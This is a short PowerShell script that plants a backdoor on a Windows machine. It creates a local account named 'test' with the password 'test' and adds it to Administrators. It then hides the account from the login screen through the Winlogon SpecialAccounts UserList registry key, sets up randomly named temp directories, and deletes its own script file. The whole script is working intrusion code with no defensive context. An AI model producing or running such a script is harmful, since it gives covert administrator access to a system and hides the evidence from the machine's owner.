# Randomly generated chars for temp dir and dir's for vbs and reg scripts
$temp_dir = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
$reg_dir = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
$vbs_dir = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))

$user = "test"
$p = ConvertTo-SecureString "test" -AsPlainText -Force

# Local user for "something" and "then excluding them from log page"
New-LocalUser $user -Password $p -FullName "test" -Description "test"
Add-LocalGroupMember -Group "Administrators" -Member $user
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user


mkdir $env:Temp/$temp_dir
echo "hi" > $env:Temp/$temp_dir/hi.txt

Remove-Item $PSCommandPath -Force
